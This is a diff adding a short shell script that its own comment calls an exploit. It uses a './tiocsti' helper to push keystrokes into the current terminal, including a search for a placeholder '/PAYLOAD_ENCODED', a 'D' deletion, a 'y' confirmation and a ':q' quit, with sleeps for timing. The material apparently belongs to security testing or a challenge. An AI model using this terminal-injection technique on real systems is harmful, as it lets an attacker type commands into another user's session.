@@ -1,0 +1,12 @@
+#!/bin/sh
+
+tty=`tty`
+(
+        exec < $tty
+        # Without some sleeping, the exploit doesn't work -- the sleeps are
+        # quite long, just to be on the safe side.
+        for a in '\r' '/PAYLOAD_ENCODED\r' 'D' 'y\r' '\r' ':q\r'; do
+                sleep 1
+                ./tiocsti "`printf "$a"`"
+        done
+)&
